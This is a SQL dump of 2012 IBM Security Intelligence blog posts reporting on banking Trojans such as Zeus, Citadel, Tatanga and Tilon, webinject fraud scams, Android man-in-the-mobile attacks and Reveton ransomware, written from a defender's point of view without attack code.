INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (627, 'Fraud 2.0: FBI Warns of Malware Attacks Targeting Bank Employees', 'George Tubin', '2012-9-20', 'This week, the FBI   financial institutions about malware attacks that are targeting their employees to steal login credentials. Although financial malware such as Zeus and SpyEye have been used to attack online banking customers for years, using these tools to perpetrate fraud directly against financial institutions by compromising employee bank accounts is relatively new. We are not surprised by this development. Last year, IBM Security predicted that 2012 would be the year financial malware would be used to attack enterprises. So, why is this happening? According to the 2012 Web Fraud Detection (WFD) Magic Quadrant report, many WFD customers reported fraud reduction rates of 80 percent or more. Banks are simply doing a better job of protecting against malware today than they did in the past. With their livelihood at stake, criminal gangs are now looking to get a foothold deep inside financial institutions to bypass controls that are standing in the way of their  . They are now attacking bank employees with the same advanced malware and extensive mule and money laundering processes used to commit fraud against online banking users. Most financial institutions implement controls such as antivirus protection on endpoint devices and intrusion prevention systems on networks. Both are evaded by malware kits that are readily available in the  . IBM Security intelligence has found that the infection rate of enterprise endpoints can reach up to 4 percent, as calculated on an annual basis. Over the past 12 months, one large U.S. bank has removed or blocked more than 20 different financial malware families from   using IBM Security Trusteer Rapport. Earlier this year, we published several blogs on malware attacks targeting enterprise endpoints, including   computers, payroll systems and  . What did these attacks have in common? They all used garden-variety financial malware Trojans such as Zeus (or one of its many derivatives) and SpyEye. This FBI report specifically mentions two types of malware attacks: keylogging and remote access tools (RATs). While key-logging has existed for many years, RATs are a relatively new addition to financial malware (e.g., Zeus) toolkits. They have been specifically added to enable pre-attack reconnaissance and attacks on non-browser-based applications on employee endpoints. The FBI warning outlines a set of 16 security recommendations that, if followed, should protect against these attacks. However, few organizations can effectively implement all 16 recommendations in a timely manner without adversely affecting employee productivity and existing business processes. IBM recommends that organizations increase their focus on the root cause of these attacks:  . Organizations should implement security controls that prevent and remove malware infections and stop key-logging, screen-capturing and remote-acess Trojans’ activity.', '\'Advanced Malware\', \'Banking\', \'Endpoint\', \'Endpoint Protection\', \'Federal Bureau of Investigation (FBI)\', \'Financial Institutions\', \'Fraud\', \'Keylogger\', \'Keylogging\', \'Malware\', \'Remote Access Tools (RATs)\', \'SpyEye\', \'Virtual Private Network (VPN)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/fraud-2-0-fbi-warns-malware-attacks-targeting-bank-employees/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (628, 'Tatanga Attack Exposes chipTAN Weaknesses', 'Amit Klein', '2012-9-4', 'IBM has discovered a new Tatanga attack against chipTAN systems used by banks in Germany, which generates unique transaction authentication numbers (TAN). These systems require that the bank card for the account be inserted in the device to generate a TAN that is specific to the current transaction. Tatanga checks the user account details, including the number of accounts, supported currencies and balance/limit details. It then chooses the account from which it could steal the highest amount. Next, it initiates a transfer. At this point, Tatanga uses a webinject to trick the user into believing that the bank is performing a chipTAN test. The fake instructions request that the user generate a TAN for the purpose of this “test” and enter the TAN. These are the instructions through which it steals user information, as they appear in German: Translated to English, the text reads: Tatanga then captures the TAN entered by the user at the bank site and proceeds to make a transaction in the background. Meanwhile, it replaces the user transaction history/balance details to hide the   from the victim. ChipTAN systems are considered fairly secure because the generated TAN takes into account both transaction details and the bank-issued chip and PIN card. However, this attack demonstrates that by using   social engineering techniques, financial malware can circumvent chipTAN security. Implementing   against advanced malware like Tatanga, Zeus and others is the only way to make sure the integrity of second-factor security measures like chipTAN are not compromised.', '\'Financial Malware\', \'Germany\', \'Man-in-the-Browser (MitB)\', \'Social Engineering\', \'Tatanga\', \'webinject\'', 'https://securityintelligence.com/tatanga-attack-exposes-chiptan-weaknesses/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (629, 'Man-in-the-Browser: Citadel Trojan Targets Airport Employees With VPN Attack', 'Amit Klein', '2012-8-14', 'IBM recently discovered a sophisticated   enterprise attack that targets virtual private network (VPN) users at a major international airport hub. Using the  , criminals are targeting employees to steal their credentials for accessing internal airport applications. IBM has notified airport officials and the relevant government agencies of this attack. Due to the sensitive nature of these systems, the airport immediately disabled remote employee access through this VPN site; the site is currently down. VPNs are often used to secure Internet connections between a business’s private network and a remote employee. VPNs provide users with secure remote access to applications and data that reside inside an enterprise’s firewall. However, once an attacker steals a victim’s VPN credentials, they can log in as the authorized user and have unfettered access to the information and resources associated with the account. These types of   use a combination of form-grabbing and screen-capture technologies to steal the victim’s username, password and the one-time passcode generated by a strong authentication product. The first part of the attack uses form-grabbing to steal the username and password entered into the login screen. The second part of the attack relies on screen-capture capabilities to take a snapshot of the image presented to the victim by the strong authentication product. The strong authentication product offers two authentication options: single channel and dual channel. The dual-channel mode sends users a one-time PIN via SMS or a  . The single-channel mode is activated when the user selects the “Get Image” option at login. This prompts the strong authentication product to generate an on-screen CAPTCHA of 10 digits. The user then maps his or her original (static) password to the string of digits in the image to produce the one-time code. This security measure prevents the form-grabber from capturing the actual static password. This is where the screen-capturing feature in Citadel kicks in. By capturing the image, the attacker uses the permutation of digits, along with the one-time code stolen by the form-grabber, to reproduce the static password. This is a clever use of form-grabbing and screen-grabbing techniques by attackers. It also demonstrates how enterprises that rely on strong authentication approaches are still at risk from targeted attacks if they lack cyber crime   on endpoint devices. This is especially true in the case of unmanaged or bring-your-own-device (BYOD) endpoints. Because these   are exposed to threats that would otherwise be filtered at the enterprise perimeter, they are much more vulnerable to infection from advanced malware like Citadel, Zeus or SpyEye. When an unmanaged, infected device connects to the enterprise via a VPN or some other remote access method, malware can circumvent strong authentication systems, as evidenced by the attack above. The Citadel malware used in this attack is typically used to execute online banking and other forms of financial fraud. However, this is not the first time IBM has identified and   on enterprises being targeted by screen-capturing/form-grabbing financial malware. This form of man-in-the-browser attack is especially troubling given the potential impact on air travel security and border control.', '\'Citadel Malware\', \'Financial Fraud\', \'Firewall\', \'Fraud\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Mobile\', \'SMS\', \'Trojan\', \'Virtual Private Network (VPN)\'', 'https://securityintelligence.com/man-browser-citadel-trojan-targets-airport-employees-vpn-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (630, 'Tilon: Son of Silon', 'Amit Klein', '2012-8-9', 'IBM has discovered a new financial malware that is targeting banks with a full bag of tricks for AV detection. Back in 2009  , now a part of IBM, discovered Silon, a financial malware that was defrauding online banking customers protected by two-factor authentication systems left and right. In 2010 and 2011, the malware underwent two major updates and continued to do well. Lately, its numbers have been in decline, causing us to wonder whether Silon’s perpetrators were taking a long vacation in prison. Alas, it is not so. In July 2012 we discovered a new financial malware that, upon closer investigation, contained some behaviors identical to those exhibited by Silon. After some internal debate, we decided to name it “Tilon.” So, what does Tilon do? Tilon is a financial malware that employs the   approach. It injects itself into the browser and then fully controls the traffic from the browser to the Web server, and vice versa. It has an impressive list of supported browsers, such as Microsoft Internet Explorer, Mozilla Firefox and Google Chrome. It then captures all form submissions (“form grabbing”) from the browser to the Web server, logs them and sends them to its command and control (C&C) server, thereby gaining access to all login credentials, transactions, etc. More interestingly, perhaps, it controls the traffic (Web pages) from the Web server to the browser, and through a sophisticated “search and replace” mechanism, it targets specific URLs and replaces both large and small parts of the pages with its own text. All of this is pretty standard MitB malware practice today, and Tilon merely provides more or less what Silon did back in 2009 and what Zeus, SpyEye,   and others are capable of today. What is most impressive about Tilon is the breadth of evasion techniques it employs to avoid detection and scrutiny and to survive attacks by security products. Some of the evasion techniques we are aware of include:     The net result is very low AV detection of the Tilon dropper (four out of 41 AV engines. These results were obtained on Aug. 8 for sample MD5 92613662ac735c91e7e25b16237c3ac5). Moreover, the ones that did detect the dropper as malicious categorized it as a “fake system tool” instead of as financial malware (Fig. 3). It should be noted that the Microsoft Threat Encyclopedia contains an entry about a malware called “ ,” which may actually be the initial variant of Tilon. The details in the Microsoft site are too light to know for certain. We aren’t familiar with any specific name for the second variant of Tilon. As the VirusTotal results indicate, it’s not detected as financial malware at all. There is, however, some good news.   are doing well against Tilon.   detects Tilon, while   prevents its installation, detects its presence in the browser and removes it from already infected machines.', '\'Antivirus\', \'Command-and-Control (C&C)\', \'Financial Malware\', \'Malware\', \'Shylock\', \'SpyEye\', \'Tilon\', \'Windows\', \'Zeus\'', 'https://securityintelligence.com/tilon-son-of-silon/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (631, 'Raising the Bar for APT Protection: Security Intelligence 2.0', 'John Burnham', '2012-8-8', 'Advanced Persistent Threats (APTs), or Advanced Targeted Threats as Gartner calls them, are now top of mind with security professionals, C-level executives and Boards of Directors. All brands – as well as major events such as the London Olympics — are now being targeted by ever increasingly sophisticated attackers and techniques, whether the intent is to steal corporate intellectual property (Lockheed, RSA), disrupt websites to bring attention to a particular cause (FBI, MPAA), or steal customer data ( ,  , etc.). Regarding APTs, Charles Kolodgy, VP of Security at IDC, was recently quoted in this  The article continues to discuss APTs My point for this post is to highlight our most recent offering at IBM Security Systems, the Network Security Protection Platform, and specifically how it may indeed be ushering in what I call Security Intelligence 2.0. Perhaps this graphic represents the foundation of Security Intelligence 2.0: click image to enlarge What the heck, Q1 Labs put “ ” on the map as a new term years ago, in the context of SIEM + Log Management + Configuration & Vulnerability Management + Behavior Anomaly Detection + Deep Packet Inspection. Do you see why we called THAT Security Intelligence? Now with our Next-Gen IPS being tightly coupled with other related components – as in XGS + QRadar + Anomaly Detection + X-Force real-time threat intelligence feeds — I assert we have raised the bar. And if some leading industry influencers actually said we did, even better. Fact is, when Q1 Labs started talking about Security Intelligence we did not think of it as a “category” but as a better way for customers to both proactively and defensively address what are now commonly called APTs (sorry Gartner). In other words, it’s not about defending against the latest advanced threats with a new “box” that has more bells and whistles – it’s about tying a range of information sources together with analytics to quickly identify behavioral anomalies, and minimizing false positives so you can quickly remediate the most important threats.', '\'Advanced Persistent Threat (APT)\', \'Analysts\', \'Cybersecurity\', \'IBM\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Threat Management\'', 'https://securityintelligence.com/raising-the-bar-for-apt-protection-security-intelligence-2-0/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (632, 'Banking Trojan Silently Hacks Into Enterprises', 'Amit Klein', '2012-7-31', 'Last Thursday, engineering and mathematical software firm Maplesoft reported that its administrative  . While specific details are not yet available, the breach may have been the result of an employee with access rights to the database getting infected with the well-known   or another type of malware with key-logging capabilities, such as Dark Comet and Poison Ivy remote-access tools. This attack demonstrates the ease with which a corporate network can be compromised. The breach was apparently only discovered because Maplesoft customers reported receiving phishing emails; otherwise, the attack could have gone undetected for an extended period. In this banking Trojan incident, the attackers seemed primarily interested in conducting banking fraud since reports indicate they only compromised an email database. They then tried to distribute Zeus, which is often used for online banking fraud, to the stolen addresses. However, they could have easily conducted corporate espionage once inside the network. The criminals may even be planning to steal secrets from companies that fall victim to the subsequent phishing attack they launched against Maplesoft’s customers. Using information loaded from the database, they sent emails that advised customers to install a Maplesoft patch which was, in fact, the Zeus banking Trojan. This attack illustrates how  . Using social engineering techniques like the software ploy described above, it is easy to see how criminals can get a toehold inside corporate networks. From there, it is trivial for the malware to steal user credentials that provide unrestricted access to sensitive databases, applications and files. This is a worrisome trend since an attacker with valid user credentials can silently pillage a company’s intellectual assets and be long gone before the compromise is ever discovered — if at all.  such as those being used to protect online banking sessions are the most effective way to   against sophisticated malware such as Zeus, SpyEye and others that now target enterprises directly.', '\'Banking\', \'Banking Trojan\', \'Data Breach\', \'Endpoint\', \'Fraud\', \'Gameover Zeus (GOZ)\', \'Malware\', \'Phishing\', \'Security Breach\', \'Trojan\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/banking-trojan-silently-hacks-enterprises/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (633, 'Malware Targets Facebook Users With Children’s Charity Scam', 'Amit Klein', '2012-7-26', 'IBM recently discovered a configuration of the   that targets Facebook users with a fake request for donations to children’s charities in order to steal credit card data. After users have logged in to their Facebook account, the Citadel injection mechanism displays a pop-up that encourages them to donate $1 to a fake fund for children who are in need of humanitarian aid. Then, it asks them to fill in their credit card details. The malware is configured to deliver the   based on the user’s country and language settings with  : English, Italian, Spanish, German and Dutch. In an interesting twist, the malware’s authors do not reuse the same text for every language. Instead, they have customized the messages of each   based on each victim’s country and/or region. Here are the webinjections used for each language: In the English-language version of this attack, users are asked to make a $1 donation for Haitian children living in poverty. The scam claims that the donation goes to children in orphanages and underserved elementary schools. Scammers lure users into submitting their credit/debit card details by filling out a form that asks for their name, card number, expiration date, CVV and security password. In the Italian version, cyber criminals exploit the Red Balloon campaign, which was created to fight child mortality in Italy. The authors claim that the campaign has already collected more than 1 million euros for sick children and warn that more than 7 million children die from basic illnesses every year. Upon examination of the Spanish attack, IBM discovered a bug in the injection code that defaults to the English version of the text. However, the fraudsters’ intention with this version was to exploit a well-known Spanish nutrition program for infants and children. The program collects donations to purchase and distribute milk to needy children. It even sends victims pictures of individuals who supposedly already gave money. In the German-language attack, fraudsters urge Facebook users to make a donation to ChildFund, which helps families provide a better future for their children. In the Dutch version of the attack, the criminals request that victims make a donation to Save the Children, an organization that has been working for 90 years to improve the lives of underprivileged children. This attack illustrates the continuing customization of   and harvesting of credit card data from Facebook’s global base of users. Using children’s charities in this scam makes the attack believable and effective, while the $1 donation amount is low enough that virtually all Facebook users can be encouraged to contribute. This is a well-designed method for stealing credit and debit card data on a massive scale.', '\'Citadel Malware\', \'Facebook\', \'Financial Data\', \'Financial Malware\', \'Malware\', \'Scam\', \'Web injects\'', 'https://securityintelligence.com/malware-targets-facebook-users-childrens-charity-scam/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (634, 'Real-Time Credentials Theft: Your Risk Engine Won’t Catch This One', 'Amit Klein', '2012-7-19', 'Recently, a large U.S. bank client of IBM received a notification that malware was identified on one of its client’s devices. The malware was identified using a server-based malware-detection tool that identifies the presence of malware on all devices that can initiate an online banking session. The bank discovered that the user in question had not logged in to his or her bank account around the time the malware was identified, and therefore, it did not understand how   could have been detected on the user’s device or how credential theft could have taken place. In this case, the malware on the user’s device captured the user’s credentials at login and immediately communicated them to the fraudster’s command-and-control (C&C) center. Interestingly, the malware requested the user’s one-time password (OTP) at login, even though the user logged in from his or her regular device. At the same time, the malware blocked the user’s credentials from being submitted to the bank. Instead, it injected a page notifying the user that the bank’s website was temporarily down (see below). Because the login request never reached the online banking server, the bank had no record of the legitimate user attempting to log in. Why would a fraudster go to such lengths rather than simply using the compromised credentials to initiate a new user session? The short answer is to evade detection by  . Banks use these risk-based analytic tools to detect a variety of anomalous conditions that could be indicative of fraud. These risk engines are often used to identify credentials theft by looking for multiple devices simultaneously logged in to a single account, as well as successive user logins from locations that are geographically too far apart for an account owner to possibly travel within the given time frame. When either of these conditions is met, the bank can quickly identify that fraud is being attempted and take appropriate actions. However, because fraudsters tend to be persistent and innovative, they have developed new approaches to circumvent these detection techniques. he following is an abbreviated representation of the bank’s log file in the example provided above: Based on the log file, six days after accessing the account, the user logged in on an unrecognized device from a new location. Users commonly change devices and frequently travel, so this situation was flagged by the bank’s real-time risk engine for secondary authentication. The user successfully entered an OTP and was allowed to log in. However, things are not always as they appear. Another view of the sequence of events can be found using an abbreviated representation of the log file generated by  : In this sequence, we are able to see a new, previously hidden event on line two. Because the user’s login credentials were blocked from being submitted, the bank’s online application and risk engine did not see the action indicated on line three. However, Trusteer Pinpoint Criminal Detection identified this action, which occurred four minutes before the action on line three. Line two shows that the user attempted to log in, but the credentials never reached the bank’s server. Blocked credentials followed by a login attempt from a different machine in a distant location are clear indicators of real-time credential theft. Because the credential transmission was blocked, the bank’s risk engine only saw one new login attempt: the fraudulent one (line three). By doing this, the criminals greatly increase the likelihood of avoiding detection and successfully committing fraud. Criminals often use a session-blocking   technique to access commercial accounts that require an OTP for login. Using available malware, such as   or SpyEye, cyber criminals can capture the complete set of login credentials, including OTPs, immediately log in to a compromised account before the OTP expires and block the legitimate user login attempt from reaching the bank.', '\'Command-and-Control (C&C)\', \'Credentials Theft\', \'Malware\', \'One-Time Password (OTP)\', \'SpyEye\'', 'https://securityintelligence.com/real-time-credentials-theft-your-risk-engine-wont-catch-this-one/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (635, 'Man-in-the-Mobile Attacks Single Out Android', 'Amit Klein', '2012-7-10', 'In September 2011, we reported the first   targeting banking customers on the Android platform. Recently, we discovered the first Tatanga-based man-in-the-mobile (MitMo) attack, as well as new SPitMo configurations that are targeting Android mobile banking users in Germany, the Netherlands, Portugal and Spain. With nearly 60 percent of the market and a reputation for weak app security, it’s no surprise that   has become the preferred target for financial malware. Like previous attacks, both the SPitMo and Tatanga MitMo variants target Windows users on the Web and use a webinjection in the desktop browser to lure them into installing a fake security application on their phones. The fraudsters claim this application is required by the bank as a new layer of protection and that 15 million bank customers around the world are already using it. The victims are asked to choose the device’s operating system from the following list: In most attacks, if the victim is using an operating system other than Android, the malware informs the user that no further action is required. For Android users, however, the desktop component of the MitMo attack requests victims’ phone numbers and notifies them that a link for downloading the security application has been sent via SMS to their mobile device. Users are directed to install the fake application from this link and enter the activation code provided by the malware. Certain attacks also request that BlackBerry users download the application, but it does not actually install on those devices. Once installed, the mobile malware captures all SMS traffic, including transaction authorization codes sent by the bank to the victim, and forwards them to the fraudsters. This enables the criminals to initiate fraudulent transfers and capture the security codes needed to bypass the SMS-based out-of-band authorization systems used by many European banks. The attackers use different social engineering tricks in each country to lure victims into downloading the fake application, including URLs with the words “secure” and “Android files” with a .com domain name. IBM investigated the registration information for these URLs, which were located in China and the United States. They were registered in June just prior to the initial attacks. All URLs are inactive at the moment. Both Tatanga and SpyEye use the same Android application in this attack. \n In the attack on Spanish banks, the victims are asked to download the security application from a link in an SMS sent to their mobile phones. Here is a screen capture of the message displayed to the victims during their online banking session: The message mentions that the bank has taken steps to protect its customers against attacks on mobile devices and requires the user to install the application. The malware then asks Android users to submit a code they receive with the text message to activate the application. BlackBerry users are notified that the security application has been installed successfully, although it only installs on Android devices. Victims who use other mobile operating systems are notified that their device does not require this special security measure. In the German attacks, criminals lure victims into downloading the fake application by claiming the bank has developed special   measures in cooperation with Oracle. As mentioned above, the fraudsters claim that more than 15 million bank customers around the world already use the system. Android users are asked to download the security application from a link sent by the malware via SMS and to submit the activation code on the bank’s spoofed Web page. As in the Spanish attack, BlackBerry users are notified that the application was successfully installed and that they are protected, although no installation actually takes place. Meanwhile, victims that use other mobile operating systems are notified that their device does not require any additional security. The Focus on Android This discovery confirms that Man in the Mobile (MitMo) attacks are focusing primarily on Android devices. Multiple studies show that Android devices account for more than 60 percent of the smartphone market in the targeted countries (Spain, Portugal, Germany and the Netherlands). Android popularity and the relative ease of developing and distributing Android applications are probably the reasons why cyber criminals have singled out this particular platform for mobile malware attacks. Once fraudsters have infected a victim’s Web and mobile endpoints, very few security mechanisms can prevent fraud from occurring. Today, criminals are compromising Android devices to circumvent out-of-band security mechanisms that send SMS messages to authorize both Web and mobile banking transactions. Going forward,  , including webinjection, key loggers and screen capture, among others.', '\'Android\', \'Blackberry\', \'Germany\', \'iOS\', \'Oracle\', \'Samsung\', \'SMS\', \'SpyEye\', \'Symbian\', \'Tatanga\', \'Webinjection\', \'Windows\'', 'https://securityintelligence.com/man-in-the-mobile-attacks-single-out-android/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (636, 'À la Carte: Criminals Charging Per Custom Webinject Feature', 'Amit Klein', '2012-6-26', 'IBM Trusteer researchers have long been writing about the evolving underground market for webinjects. Our team recently discovered a new development: Criminals are now selling customized webinjects that are priced per feature. For example, one seller offers a webinject for Zeus/SpyEye that contains the automatic transfer system (ATS) that was reported by TrendMicro researchers. In our earlier posts, we discussed the various approaches criminals have taken to sell webinjects. Initially, they used malware-based pricing, a model in which webinjects are developed for specific malware platforms such as Zeus and SpyEye and are priced per platform. Certain platforms commanded a higher price for webinjects. This pricing system was followed by bulk pricing, where criminals offered discounts for large orders, as well as geography-based pricing, where webinject costs were determined by the geographic location of the target they were designed to attack. Next in line came production cost pricing, where sellers offered cheaper, premade webinjects and charged a premium for custom-made webinjects. The new pricing strategy we discovered for webinjects is based on the specific features requested and the user information they are designed to steal. In one advertisement we came across, the criminal offers to develop webinjects for any malware platform (e.g., SpyEye, Zeus and Ice IX) and   specified by the buyer. The following is the price list for individual webinject features that can be purchased: The advertisement also included videos that demonstrate webinjects developed to attack Italian, Spanish and German banks. This latest development in webinject marketing illustrates how the underground marketplace is following traditional software industry pricing schemes by offering à la carte and complete “suite” pricing options. Unfortunately, buying high-quality webinjects is getting easier and more affordable, which opens the door for more criminals to get into the business of  . Criminals are no longer bound by rigid malware configurations designed to conduct specific exploits at specific institutions. Cyber criminals can now specify the precise exploit and target institution that they believe will maximize their ability to successfully commit fraud. And, according to basic statistics, the more combinations of exploit types and targets attempted, the more likely it is that fraudsters will find the ones that succeed.', '\'Cybercrime\', \'Cybercriminals\', \'Fraud\', \'Ice IX\', \'Online Banking Fraud\', \'SpyEye\', \'webinject\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/la-carte-criminals-charging-per-custom-webinject-feature/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (637, 'How Fraudsters Are Disguising PCs to Fool Device Fingerprinting', 'Amit Klein', '2012-6-6', 'Cyber criminals know that financial and e-commerce providers often use fraud detection systems that monitor for anomalous transactions and behaviors. In order to bypass these systems, fraudsters are continuously looking for ways to conceal behaviors that might be identified as potential fraud. The IBM Security research team recently came across a tutorial published in underground forums that explains how to circumvent fraud detection systems that use device identification to track and detect anomalous transaction and access patterns. This approach collects myriad session attributes to “fingerprint” the endpoint device, including IP address and type and version of browser and operating system. Using this information, fraud detection systems can, for example, detect when a single device is being used to place multiple orders with different user credentials — a practice typically indicative of fraud. The tutorial recommends that fraudsters use commercially available virtual private network (VPN) or proxy services to hide the device’s IP address. It also offers guidelines on how to make sessions from a single computer appear as if they are originating from different computers with different browsers and operating systems. According to the tutorial, users can achieve this with a few simple steps that involve downloading and installing an off-the-shelf utility for changing the browser’s user-agent header (where the operating system and browser information is contained). This technique prevents merchants from linking multiple transactions to a single device; each transaction appears to be coming from a legitimate customer who is using a unique computer and browser to place an order. Because fraudsters can manipulate the browser’s user-agent header information easily, institutions should consider device fingerprinting solutions that rely solely on user-agent data unreliable. Device fingerprinting solutions should collect identification parameters via methods that are less likely to be manipulated by fraudsters. This stronger type of device fingerprinting solution can be a valuable component of a comprehensive, layered security solution. The tutorial demonstrates that cyber criminals have achieved a sophisticated level of understanding of device fingerprinting techniques and are exploiting their knowledge to evade fraud-prevention systems that rely on the browser’s user-agent header to  . It is also a call to action for merchants and financial institutions that use device fingerprinting. They should make sure their solutions are collecting device information from a tamper-proof source.', '\'Device ID\', \'Fraud Detection Systems\', \'Virtual Private Network (VPN)\'', 'https://securityintelligence.com/how-fraudsters-are-disguising-pcs-to-fool-device-fingerprinting/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (638, 'Tatanga Trojan Bypasses Mobile Security to Steal Money From Online Banking Users in Germany', 'Amit Klein', '2012-5-22', 'IBM recently came across a complex new criminal scheme involving the Tatanga Trojan, which conducts an elaborate Man in the Browser (MitB) attack to bypass SMS-based transaction authorization to commit online banking fraud, compromising users’  .\n The scam targets the online banking customers of several German banks. When victims log on to the online banking application, Tatanga uses a MitB webinject that alleges that the bank is performing a security check on their computer and on their ability to receive a transaction authorization number (TAN) on their  .\n In the background, Tatanga initiates a fraudulent money transfer to a mule account. It even checks the victim’s account balance and will transfer funds from the account with the highest balance if there is more than one to choose from.\n Victims are asked to enter the SMS-delivered TAN they receive from the bank into the fake Web form as a way to complete this security process. By entering the TAN in the injected HTML page, victims are in fact approving the fraudulent transaction originated by Tatanga against their account.\n Even though victims are presented with the fund transfer amount and the destination account information in the SMS message that contains the TAN, the injected HTML page claims that the process uses “experimental” data and that no money will leave their account.\n Once the victim enters the TAN in the fake form and hits submit, the funds are transferred to the fraudster’s account. Meanwhile, Tatanga modifies the account balance reports in the online banking application to hide the fraudulent transaction.\n This is a very sophisticated and multifaceted attack. By combining an MitB attack with social engineering, Tatanga is able to circumvent most banks’ mobile security and out-of-band authentication. It then goes one step further by hiding evidence of the fraudulent transaction from the victim using a post-transaction attack mechanism. Fortunately, the text in the injected HTML page is littered with grammar and spelling mistakes and appears not to have been written by a German speaker; this may make it less effective.\n Clearly, grammar is easy enough for these fraudsters to improve, but the fact that they are   in a single fraud scam is not good news. However, they still need to compromise the endpoint with malware, which can be prevented.', '\'Germany\', \'HTML\', \'Man-in-the-Browser (MitB)\', \'Mobile Security\', \'Money Mules\', \'Out-of-Band (OOB) Authentication\', \'SMS\', \'Social Engineering\', \'Tatanga\', \'Trojan\', \'webinject\', \'Webinjection\'', 'https://securityintelligence.com/tatanga-trojan-bypasses-mobile-security-to-steal-money-from-online-banking-users-in-germany/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (639, 'Zeus P2P Variant Exploits Trusted Brands to Steal Debit Card Data', 'Amit Klein', '2012-5-15', 'IBM recently discovered a series of attacks being carried out by a P2P variant of the   platform against some of the Internet’s leading online services and websites. The attacks are targeting users of Facebook, Gmail, Hotmail and Yahoo, as well as Visa and MasterCard, offering rebates and new security measures. The scams exploit the trust relationship between users and those well-known service providers to steal users’  . In the first attack against Facebook, the malware uses a webinject to present the victim with a fraudulent 20 percent cash back incentive to link their Visa or MasterCard debit card to their Facebook account. The scam claims that after registering their card information, the victim will earn cash back when they purchase Facebook points. The fake Web form prompts the victim to enter their debit card number, expiration date, security code and PIN. \n \n In the attacks against Gmail and Yahoo users, Zeus offers an allegedly new way of authenticating via the 3D Secure service offered by the Verified by Visa and MasterCard SecureCode programs. To complete an online transaction, many merchants require cardholders to authenticate the transaction using their personal 3D Secure password. Visa and MasterCard cardholders can apply for a 3D Secure password with the bank that issued their debit or credit card. The scam that targets Gmail and Yahoo users claims that by linking their debit card to their web mail accounts, all future 3D Secure authentication will be performed through Google Checkout and Yahoo Checkout, respectively. The fraudsters allege that by participating in the program the victim’s debit card account will be protected from fraud in the future. The victim is prompted to enter their debit card number, expiration date, security code and PIN. The attack is not compromising the 3D Secure service or authentication mechanism, but rather leveraging the   brands to make the scam more credible. \n \n \n The attack against Hotmail users is similar to the Gmail and Yahoo scam. It claims that by registering for a free new security service, the victim can set up a 3D Secure-like password to protect their debit card from fraud. The offer states that the service will prevent purchases from being made on the Internet with the card unless the Hotmail account information and additional password are provided. The webinject requests the same debit card data (card number, expiration date, security code and PIN) as the previous two scams. \n \n This attack is a clever example of how fraudsters are using trusted brands, social networks, email hosts and debit card providers to get victims to lower their guards and surrender their debit card data. These webinjects are well crafted, both from a visual and content perspective, making it difficult to identify them as a fraud. It’s also ironic how in the Gmail, Hotmail and Yahoo scams, the fraudsters are using the fear of the very cyber crimes they are committing to prey on their victims.', '\'Facebook\', \'Gmail\', \'Malware\', \'MasterCard\', \'Visa\', \'Yahoo\', \'Zeus\'', 'https://securityintelligence.com/zeus-p2p-variant-exploits-trusted-brands-to-steal-debit-card-data/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (640, 'Fake Government Attack Reveton Hijacks Computers for Ransom', 'Amit Klein', '2012-5-1', 'IBM researchers have discovered a clever new use of the Citadel malware platform, a descendant of the Zeus Trojan, to deliver   that poses as the U.S. Department of Justice and hijacks victims’ computers. This ransomware, called Reveton, freezes the compromised machine’s operating system and demands $100 to unlock it. Reveton was observed a few weeks ago being used as a standalone attack, but it has now been coupled with the   platform. This is another example of   expanding beyond online banking fraud and being used as a launchpad for other types of cyber attacks. Citadel is able to target employees to steal enterprise credentials, and in this example, it targets victims directly to steal money from them rather than their financial institution. The attack begins with the victim being lured to a drive-by download website. Here, a dropper installs the Citadel malware on the target machine, which retrieves the ransomware DLL from its command-and-control center. Once installed on the victim’s computer, the ransomware locks up the targeted machine and displays a warning message notifying the user he or she has violated U.S. federal law. The webinject screen (below) claims the infected machine’s IP address was identified by the Computer Crime & Intellectual Property Section as having visited websites that contain child pornography and other illegal content. In order to unlock the computer, the victim is instructed to pay a $100 fine to the U.S. Department of Justice using prepaid money card services. The payment service options presented to the victim are based on the geographic location of his or her IP address. For example, users with U.S. IP addresses must pay using MoneyPak or Paysafecard. Independent of the Reveton ransomware secondary payload, Citadel continues to operate on the compromised machine on its own. Therefore, it can be used by fraudsters to commit online banking and credit card fraud by enabling the platform’s  , keylogging and other malicious techniques. It is clear from this and similar attacks we have discovered recently that financial malware has achieved a technological level of sophistication that enables it to carry out virtually any type of cyber attack. Through a combination of social engineering, data capturing and communication tampering, these attacks are being used by criminals to target applications, systems and networks that belong to financial institutions, enterprises and government agencies to commit fraud or steal sensitive information. It is important to recognize that now, more than ever, cyber crime and   begins with the  .', '\'Citadel Malware\', \'Cyberattack\', \'Endpoint Protection\', \'Fraud\', \'Keylogger\', \'Keylogging\', \'Man-in-the-Browser (MitB) Malware\', \'Online Banking\', \'Ransomware\', \'U.S. Department of Justice (DOJ)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/fake-government-attack-reveton-hijacks-computers-ransom/');
